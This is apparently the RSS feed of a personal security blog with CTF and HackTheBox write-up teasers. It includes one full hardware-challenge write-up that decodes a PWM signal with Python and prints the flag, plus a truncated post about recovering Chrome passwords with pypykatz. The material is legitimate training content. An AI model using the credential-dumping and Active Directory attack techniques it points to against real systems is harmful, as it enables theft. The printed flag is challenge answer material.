<?xml version="1.0" encoding="utf-8"?>
<?xml-stylesheet type="text/xsl" href="assets/xml/rss.xsl" media="all"?><rss version="2.0" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>haicen.me</title><link>https://blog.haicen.me/</link><description>Haicen's personal website</description><atom:link href="https://blog.haicen.me/rss.xml" rel="self" type="application/rss+xml"></atom:link><language>en</language><copyright>Contents © 2023 &lt;a href="mailto:haicenhack@protonmail.com"&gt;Haicen&lt;/a&gt; </copyright><lastBuildDate>Sat, 18 Nov 2023 13:36:39 GMT</lastBuildDate><generator>Nikola (getnikola.com)</generator><docs>http://blogs.law.harvard.edu/tech/rss</docs><item><title>Fun with GUID's</title><link>https://blog.haicen.me/posts/fun-with-guids/</link><dc:creator>Haicen</dc:creator><description>&lt;div&gt;&lt;p&gt;Recently, Intigrity (&lt;a class="reference external" href="https://twitter.com/intigriti"&gt;https://twitter.com/intigriti&lt;/a&gt;) posted a challenge on Twitter.
I found this challenge to be pretty interesting, as I had not really heard of any issues regarding GUIDs (Global Unique IDentifier), sometimes also listed as UUID (Universally unique identifier).
These are all what I had previously assumed were essentially random and non-predictable.
Unfortunately, some versions of the UUID are not so random, at least for UUIDv1.&lt;/p&gt;
&lt;figure&gt;
&lt;img alt="/images/fun-with-guids/homepage.png" src="https://blog.haicen.me/images/fun-with-guids/homepage.png"&gt;
&lt;/figure&gt;
&lt;p&gt;The rest of the post continues after the break.&lt;/p&gt;
&lt;p&gt;&lt;a href="https://blog.haicen.me/posts/fun-with-guids/"&gt;Read more…&lt;/a&gt; (6 min remaining to read)&lt;/p&gt;&lt;/div&gt;</description><category>guid</category><category>node.js</category><category>web</category><category>zap</category><guid>https://blog.haicen.me/posts/fun-with-guids/</guid><pubDate>Sat, 22 Oct 2022 02:42:13 GMT</pubDate></item><item><title>HackTheBox - Search</title><link>https://blog.haicen.me/posts/hackthebox-search/</link><dc:creator>Haicen</dc:creator><description>&lt;section id="introduction"&gt;
&lt;h2&gt;Introduction&lt;/h2&gt;
&lt;p&gt;Search is a retired HackTheBox machine which contains several common windows exploits.
I completed this box a while ago, but it now that it has retired, I can post my writeup.
Some of the tools used to complete this box are: crackmapexec, gmsadumper, bloodhound, smbclient, and rpcclient.&lt;/p&gt;
&lt;p&gt;&lt;a href="https://blog.haicen.me/posts/hackthebox-search/"&gt;Read more…&lt;/a&gt; (6 min remaining to read)&lt;/p&gt;&lt;/section&gt;</description><category>active directory</category><category>crackmapexec</category><category>hacking</category><category>nmap</category><category>windows</category><guid>https://blog.haicen.me/posts/hackthebox-search/</guid><pubDate>Wed, 20 Jul 2022 12:34:09 GMT</pubDate></item><item><title>Configuring custom headers for OWASP ZAP</title><link>https://blog.haicen.me/posts/configuring-custom-headers-for-owasp-zap/</link><dc:creator>Haicen</dc:creator><description>&lt;div&gt;&lt;p&gt;I've been trying some bugbounty programs recently.
I often alternate between using BurpSuite and ZAP.
Many programs want you to add a custom header to your requests so the traffic can be identified, and in some cases, bypass some roadblocks.
In this post, I'll show how to configure ZAP to add the custom header.&lt;/p&gt;
&lt;img alt="/images/zap-header/teaser.png" src="https://blog.haicen.me/images/zap-header/teaser.png"&gt;
&lt;p&gt;&lt;a href="https://blog.haicen.me/posts/configuring-custom-headers-for-owasp-zap/"&gt;Read more…&lt;/a&gt; (2 min remaining to read)&lt;/p&gt;&lt;/div&gt;</description><category>hacking</category><category>tutorial</category><guid>https://blog.haicen.me/posts/configuring-custom-headers-for-owasp-zap/</guid><pubDate>Sat, 18 Jun 2022 12:47:43 GMT</pubDate></item><item><title>Cyber Apocalypse 2022 - Space Pulses</title><link>https://blog.haicen.me/posts/cyber-apocalypse-2022-space-pulses/</link><dc:creator>Haicen</dc:creator><description>&lt;p&gt;This challenge was part of the hardware category, and was pretty interesting.
Here is the challenge description:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;One of our enhanced radio telescopes captured some weird fluctuations from a nearby star. It was idle for decades due to the fact that it was fully enclosed by a Dyson Sphere but its patterns began to change drastically leading us to believe that someone is controlling part of the megastructure to release energy and send these pulses directed to us in order to transmit a message. They must have known that our equipment can read even the slightest fluctuations.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;There was a downloadable file, which was a saleae logic file.
This definitely isn't something easy like serial.
It seems like it might have some time dependent information encoded, because the pulse time is not consistent.
I started to suspect this might be some sort of pulse width modulation encoding scheme.&lt;/p&gt;
&lt;img alt="/images/space_pulses/initial.png" src="https://blog.haicen.me/images/space_pulses/initial.png"&gt;
&lt;p&gt;First, I exported the signal from Logic2 as a CSV so I could work with it.
I started by plotting the time each pulse was on vs off.
I knew the time was in seconds, so the pulse times would be small.&lt;/p&gt;
&lt;div class="code"&gt;&lt;pre class="code python"&gt;&lt;a id="rest_code_426ee0aba2dc483d8242a4d0afe5f02f-1" name="rest_code_426ee0aba2dc483d8242a4d0afe5f02f-1" href="https://blog.haicen.me/posts/cyber-apocalypse-2022-space-pulses/#rest_code_426ee0aba2dc483d8242a4d0afe5f02f-1"&gt;&lt;/a&gt;&lt;span class="n"&gt;iimport&lt;/span&gt; &lt;span class="n"&gt;numpy&lt;/span&gt; &lt;span class="k"&gt;as&lt;/span&gt; &lt;span class="n"&gt;np&lt;/span&gt;
&lt;a id="rest_code_426ee0aba2dc483d8242a4d0afe5f02f-2" name="rest_code_426ee0aba2dc483d8242a4d0afe5f02f-2" href="https://blog.haicen.me/posts/cyber-apocalypse-2022-space-pulses/#rest_code_426ee0aba2dc483d8242a4d0afe5f02f-2"&gt;&lt;/a&gt;&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;matplotlib&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;pyplot&lt;/span&gt; &lt;span class="k"&gt;as&lt;/span&gt; &lt;span class="n"&gt;plt&lt;/span&gt;
&lt;a id="rest_code_426ee0aba2dc483d8242a4d0afe5f02f-3" name="rest_code_426ee0aba2dc483d8242a4d0afe5f02f-3" href="https://blog.haicen.me/posts/cyber-apocalypse-2022-space-pulses/#rest_code_426ee0aba2dc483d8242a4d0afe5f02f-3"&gt;&lt;/a&gt;
&lt;a id="rest_code_426ee0aba2dc483d8242a4d0afe5f02f-4" name="rest_code_426ee0aba2dc483d8242a4d0afe5f02f-4" href="https://blog.haicen.me/posts/cyber-apocalypse-2022-space-pulses/#rest_code_426ee0aba2dc483d8242a4d0afe5f02f-4"&gt;&lt;/a&gt;&lt;span class="n"&gt;sig&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;np&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;genfromtxt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;'sp_digital.txt'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;delimiter&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;','&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;skip_header&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;a id="rest_code_426ee0aba2dc483d8242a4d0afe5f02f-5" name="rest_code_426ee0aba2dc483d8242a4d0afe5f02f-5" href="https://blog.haicen.me/posts/cyber-apocalypse-2022-space-pulses/#rest_code_426ee0aba2dc483d8242a4d0afe5f02f-5"&gt;&lt;/a&gt;&lt;span class="n"&gt;values&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;np&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;diff&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;sig&lt;/span&gt;&lt;span class="p"&gt;[:,&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="mi"&gt;1000&lt;/span&gt;
&lt;a id="rest_code_426ee0aba2dc483d8242a4d0afe5f02f-6" name="rest_code_426ee0aba2dc483d8242a4d0afe5f02f-6" href="https://blog.haicen.me/posts/cyber-apocalypse-2022-space-pulses/#rest_code_426ee0aba2dc483d8242a4d0afe5f02f-6"&gt;&lt;/a&gt;
&lt;a id="rest_code_426ee0aba2dc483d8242a4d0afe5f02f-7" name="rest_code_426ee0aba2dc483d8242a4d0afe5f02f-7" href="https://blog.haicen.me/posts/cyber-apocalypse-2022-space-pulses/#rest_code_426ee0aba2dc483d8242a4d0afe5f02f-7"&gt;&lt;/a&gt;&lt;span class="n"&gt;plt&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;figure&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;a id="rest_code_426ee0aba2dc483d8242a4d0afe5f02f-8" name="rest_code_426ee0aba2dc483d8242a4d0afe5f02f-8" href="https://blog.haicen.me/posts/cyber-apocalypse-2022-space-pulses/#rest_code_426ee0aba2dc483d8242a4d0afe5f02f-8"&gt;&lt;/a&gt;&lt;span class="n"&gt;plt&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;plot&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;values&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;
&lt;a id="rest_code_426ee0aba2dc483d8242a4d0afe5f02f-9" name="rest_code_426ee0aba2dc483d8242a4d0afe5f02f-9" href="https://blog.haicen.me/posts/cyber-apocalypse-2022-space-pulses/#rest_code_426ee0aba2dc483d8242a4d0afe5f02f-9"&gt;&lt;/a&gt;&lt;span class="n"&gt;plt&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;savefig&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;'signal_plot.png'&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;a id="rest_code_426ee0aba2dc483d8242a4d0afe5f02f-10" name="rest_code_426ee0aba2dc483d8242a4d0afe5f02f-10" href="https://blog.haicen.me/posts/cyber-apocalypse-2022-space-pulses/#rest_code_426ee0aba2dc483d8242a4d0afe5f02f-10"&gt;&lt;/a&gt;&lt;span class="n"&gt;plt&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;close&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;That produced the following output:&lt;/p&gt;
&lt;img alt="/images/space_pulses/signal_plot.png" src="https://blog.haicen.me/images/space_pulses/signal_plot.png"&gt;
&lt;p&gt;That pretty much confirmed my suspicions that this was PWM.
The time delta does not exceed 255 for any pulse, so that seems like it may be an ascii encoded string.
Let's convert it.&lt;/p&gt;
&lt;div class="code"&gt;&lt;pre class="code python"&gt;&lt;a id="rest_code_7b8d609fcc4b4dcfa5a6fdb65eaa4a97-1" name="rest_code_7b8d609fcc4b4dcfa5a6fdb65eaa4a97-1" href="https://blog.haicen.me/posts/cyber-apocalypse-2022-space-pulses/#rest_code_7b8d609fcc4b4dcfa5a6fdb65eaa4a97-1"&gt;&lt;/a&gt;&lt;span class="n"&gt;rounded_values&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;np&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;round&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;values&lt;/span&gt;&lt;span class="p"&gt;[::&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;
&lt;a id="rest_code_7b8d609fcc4b4dcfa5a6fdb65eaa4a97-2" name="rest_code_7b8d609fcc4b4dcfa5a6fdb65eaa4a97-2" href="https://blog.haicen.me/posts/cyber-apocalypse-2022-space-pulses/#rest_code_7b8d609fcc4b4dcfa5a6fdb65eaa4a97-2"&gt;&lt;/a&gt;&lt;span class="n"&gt;floor_values&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;np&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;floor&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;values&lt;/span&gt;&lt;span class="p"&gt;[::&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;
&lt;a id="rest_code_7b8d609fcc4b4dcfa5a6fdb65eaa4a97-3" name="rest_code_7b8d609fcc4b4dcfa5a6fdb65eaa4a97-3" href="https://blog.haicen.me/posts/cyber-apocalypse-2022-space-pulses/#rest_code_7b8d609fcc4b4dcfa5a6fdb65eaa4a97-3"&gt;&lt;/a&gt;&lt;span class="n"&gt;ceil_values&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;int_values&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;
&lt;a id="rest_code_7b8d609fcc4b4dcfa5a6fdb65eaa4a97-4" name="rest_code_7b8d609fcc4b4dcfa5a6fdb65eaa4a97-4" href="https://blog.haicen.me/posts/cyber-apocalypse-2022-space-pulses/#rest_code_7b8d609fcc4b4dcfa5a6fdb65eaa4a97-4"&gt;&lt;/a&gt;
&lt;a id="rest_code_7b8d609fcc4b4dcfa5a6fdb65eaa4a97-5" name="rest_code_7b8d609fcc4b4dcfa5a6fdb65eaa4a97-5" href="https://blog.haicen.me/posts/cyber-apocalypse-2022-space-pulses/#rest_code_7b8d609fcc4b4dcfa5a6fdb65eaa4a97-5"&gt;&lt;/a&gt;&lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;v&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;rounded_values&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;floor_values&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;ceil_values&lt;/span&gt;&lt;span class="p"&gt;]:&lt;/span&gt;
&lt;a id="rest_code_7b8d609fcc4b4dcfa5a6fdb65eaa4a97-6" name="rest_code_7b8d609fcc4b4dcfa5a6fdb65eaa4a97-6" href="https://blog.haicen.me/posts/cyber-apocalypse-2022-space-pulses/#rest_code_7b8d609fcc4b4dcfa5a6fdb65eaa4a97-6"&gt;&lt;/a&gt;    &lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;''&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;join&lt;/span&gt;&lt;span class="p"&gt;([&lt;/span&gt;&lt;span class="nb"&gt;chr&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;int&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;x&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;v&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;:]]))&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;I did not know whether my floating point values from the time delta should be rounded, floored, or ceiling-ed, so I did all 3.
My script output the following:&lt;/p&gt;
&lt;pre class="literal-block"&gt;Dppsejobuft!.!SB!2:i!69n!33t!}!Efd!,46+!23(!7((!.!Wbmjebujpo!tfdsfu!dpef;!IUC|qv2646`n1ev2582o:`2o`6q5d4"63&amp;amp;~
Coordinates - RA 19h 58m 22s | Dec +35* 12' 6'' - Validation secret code: HTB{pu1535_m0du1471n9_1n_5p4c3!52%}
Dppsejobuft!.!SB!2:i!69n!33t!}!Efd!,46+!23(!7((!.!Wbmjebujpo!tfdsfu!dpef;!IUC|qv2646`n1ev2582o:`2o`6q5d4"63&amp;amp;~&lt;/pre&gt;
&lt;p&gt;The only one that produced reasonable output was floor. The flag is in the last half of the message.&lt;/p&gt;
&lt;p&gt;The full script is below:&lt;/p&gt;
&lt;div class="code"&gt;&lt;pre class="code python"&gt;&lt;a id="rest_code_3bffba1db8d143b2b91fef703c660b12-1" name="rest_code_3bffba1db8d143b2b91fef703c660b12-1" href="https://blog.haicen.me/posts/cyber-apocalypse-2022-space-pulses/#rest_code_3bffba1db8d143b2b91fef703c660b12-1"&gt;&lt;/a&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;numpy&lt;/span&gt; &lt;span class="k"&gt;as&lt;/span&gt; &lt;span class="nn"&gt;np&lt;/span&gt;
&lt;a id="rest_code_3bffba1db8d143b2b91fef703c660b12-2" name="rest_code_3bffba1db8d143b2b91fef703c660b12-2" href="https://blog.haicen.me/posts/cyber-apocalypse-2022-space-pulses/#rest_code_3bffba1db8d143b2b91fef703c660b12-2"&gt;&lt;/a&gt;&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;matplotlib&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;pyplot&lt;/span&gt; &lt;span class="k"&gt;as&lt;/span&gt; &lt;span class="n"&gt;plt&lt;/span&gt;
&lt;a id="rest_code_3bffba1db8d143b2b91fef703c660b12-3" name="rest_code_3bffba1db8d143b2b91fef703c660b12-3" href="https://blog.haicen.me/posts/cyber-apocalypse-2022-space-pulses/#rest_code_3bffba1db8d143b2b91fef703c660b12-3"&gt;&lt;/a&gt;
&lt;a id="rest_code_3bffba1db8d143b2b91fef703c660b12-4" name="rest_code_3bffba1db8d143b2b91fef703c660b12-4" href="https://blog.haicen.me/posts/cyber-apocalypse-2022-space-pulses/#rest_code_3bffba1db8d143b2b91fef703c660b12-4"&gt;&lt;/a&gt;&lt;span class="n"&gt;sig&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;np&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;genfromtxt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;'sp_digital.txt'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;delimiter&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;','&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;skip_header&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;a id="rest_code_3bffba1db8d143b2b91fef703c660b12-5" name="rest_code_3bffba1db8d143b2b91fef703c660b12-5" href="https://blog.haicen.me/posts/cyber-apocalypse-2022-space-pulses/#rest_code_3bffba1db8d143b2b91fef703c660b12-5"&gt;&lt;/a&gt;&lt;span class="n"&gt;values&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;np&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;diff&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;sig&lt;/span&gt;&lt;span class="p"&gt;[:,&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="mi"&gt;1000&lt;/span&gt;
&lt;a id="rest_code_3bffba1db8d143b2b91fef703c660b12-6" name="rest_code_3bffba1db8d143b2b91fef703c660b12-6" href="https://blog.haicen.me/posts/cyber-apocalypse-2022-space-pulses/#rest_code_3bffba1db8d143b2b91fef703c660b12-6"&gt;&lt;/a&gt;
&lt;a id="rest_code_3bffba1db8d143b2b91fef703c660b12-7" name="rest_code_3bffba1db8d143b2b91fef703c660b12-7" href="https://blog.haicen.me/posts/cyber-apocalypse-2022-space-pulses/#rest_code_3bffba1db8d143b2b91fef703c660b12-7"&gt;&lt;/a&gt;&lt;span class="n"&gt;plt&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;figure&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;a id="rest_code_3bffba1db8d143b2b91fef703c660b12-8" name="rest_code_3bffba1db8d143b2b91fef703c660b12-8" href="https://blog.haicen.me/posts/cyber-apocalypse-2022-space-pulses/#rest_code_3bffba1db8d143b2b91fef703c660b12-8"&gt;&lt;/a&gt;&lt;span class="n"&gt;plt&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;plot&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;values&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;
&lt;a id="rest_code_3bffba1db8d143b2b91fef703c660b12-9" name="rest_code_3bffba1db8d143b2b91fef703c660b12-9" href="https://blog.haicen.me/posts/cyber-apocalypse-2022-space-pulses/#rest_code_3bffba1db8d143b2b91fef703c660b12-9"&gt;&lt;/a&gt;&lt;span class="n"&gt;plt&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;savefig&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;'signal_plot.png'&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;a id="rest_code_3bffba1db8d143b2b91fef703c660b12-10" name="rest_code_3bffba1db8d143b2b91fef703c660b12-10" href="https://blog.haicen.me/posts/cyber-apocalypse-2022-space-pulses/#rest_code_3bffba1db8d143b2b91fef703c660b12-10"&gt;&lt;/a&gt;&lt;span class="n"&gt;plt&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;close&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;a id="rest_code_3bffba1db8d143b2b91fef703c660b12-11" name="rest_code_3bffba1db8d143b2b91fef703c660b12-11" href="https://blog.haicen.me/posts/cyber-apocalypse-2022-space-pulses/#rest_code_3bffba1db8d143b2b91fef703c660b12-11"&gt;&lt;/a&gt;
&lt;a id="rest_code_3bffba1db8d143b2b91fef703c660b12-12" name="rest_code_3bffba1db8d143b2b91fef703c660b12-12" href="https://blog.haicen.me/posts/cyber-apocalypse-2022-space-pulses/#rest_code_3bffba1db8d143b2b91fef703c660b12-12"&gt;&lt;/a&gt;&lt;span class="n"&gt;rounded_values&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;np&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;round&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;values&lt;/span&gt;&lt;span class="p"&gt;[::&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;
&lt;a id="rest_code_3bffba1db8d143b2b91fef703c660b12-13" name="rest_code_3bffba1db8d143b2b91fef703c660b12-13" href="https://blog.haicen.me/posts/cyber-apocalypse-2022-space-pulses/#rest_code_3bffba1db8d143b2b91fef703c660b12-13"&gt;&lt;/a&gt;&lt;span class="n"&gt;int_values&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;np&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;floor&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;values&lt;/span&gt;&lt;span class="p"&gt;[::&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;
&lt;a id="rest_code_3bffba1db8d143b2b91fef703c660b12-14" name="rest_code_3bffba1db8d143b2b91fef703c660b12-14" href="https://blog.haicen.me/posts/cyber-apocalypse-2022-space-pulses/#rest_code_3bffba1db8d143b2b91fef703c660b12-14"&gt;&lt;/a&gt;&lt;span class="n"&gt;ceil_values&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;int_values&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;
&lt;a id="rest_code_3bffba1db8d143b2b91fef703c660b12-15" name="rest_code_3bffba1db8d143b2b91fef703c660b12-15" href="https://blog.haicen.me/posts/cyber-apocalypse-2022-space-pulses/#rest_code_3bffba1db8d143b2b91fef703c660b12-15"&gt;&lt;/a&gt;
&lt;a id="rest_code_3bffba1db8d143b2b91fef703c660b12-16" name="rest_code_3bffba1db8d143b2b91fef703c660b12-16" href="https://blog.haicen.me/posts/cyber-apocalypse-2022-space-pulses/#rest_code_3bffba1db8d143b2b91fef703c660b12-16"&gt;&lt;/a&gt;&lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;v&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;rounded_values&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;int_values&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;ceil_values&lt;/span&gt;&lt;span class="p"&gt;]:&lt;/span&gt;
&lt;a id="rest_code_3bffba1db8d143b2b91fef703c660b12-17" name="rest_code_3bffba1db8d143b2b91fef703c660b12-17" href="https://blog.haicen.me/posts/cyber-apocalypse-2022-space-pulses/#rest_code_3bffba1db8d143b2b91fef703c660b12-17"&gt;&lt;/a&gt;    &lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;''&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;join&lt;/span&gt;&lt;span class="p"&gt;([&lt;/span&gt;&lt;span class="nb"&gt;chr&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;int&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;x&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;v&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;:]]))&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;</description><guid>https://blog.haicen.me/posts/cyber-apocalypse-2022-space-pulses/</guid><pubDate>Mon, 30 May 2022 16:34:49 GMT</pubDate></item><item><title>Cyber Apocalypse 2022 - Blinkerfluids</title><link>https://blog.haicen.me/posts/cyber-apocalypse-2022-blinkerfluids/</link><dc:creator>Haicen</dc:creator><description>&lt;div&gt;&lt;p&gt;This was the first web challenge I solved in the Cyber Apocalypse 2022 CTF.
This challenge had a downloadable portion with a fake flag as well as a web instance with an actual flag.
Since the CTF has been over for a while and I didn't capture any of the actual challenge, I am recreating the steps I took here using the docker container.&lt;/p&gt;
&lt;p&gt;&lt;a href="https://blog.haicen.me/posts/cyber-apocalypse-2022-blinkerfluids/"&gt;Read more…&lt;/a&gt; (3 min remaining to read)&lt;/p&gt;&lt;/div&gt;</description><guid>https://blog.haicen.me/posts/cyber-apocalypse-2022-blinkerfluids/</guid><pubDate>Mon, 30 May 2022 15:33:08 GMT</pubDate></item><item><title>Dumping chrome passwords using pypykatz</title><link>https://blog.haicen.me/posts/dumping-chrome-passwords-using-pypykatz/</link><dc:creator>Haicen</dc:creator><description>&lt;div&gt;&lt;p&gt;I recently competed in the Cyber Apocalypse 2022 CTF on Hackthebox.
This was a really fun experience (and my first ever live CTF).
I only solved a few challenges (which I'll be writing in subsequent posts), but there was one vexating challenge which I wasn't able to complete.
I kinda had the right idea, but I was missing some key pieces of information.
The point of this post is to explain what I was missing and how it works (and to document how I would have done it).&lt;/p&gt;
&lt;p&gt;This particular challenge was called "Siezed"&lt;/p&gt;
&lt;p&gt;The challenge description read&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Miyuki is now after a newly formed ransomware division which works for Longhir. This division's goal is to target any critical infrastructure and cause financial losses to their opponents. They never restore the encrypted files, even if the victim pays the ransom. This case is the number one priority for the team at the moment. Miyuki has seized the hard-drive of one of the members and it is believed that inside of which there may be credentials for the Ransomware's Dashboard. Given the AppData folder, can you retrieve the wanted credentials?&lt;/p&gt;
&lt;/blockquote&gt;
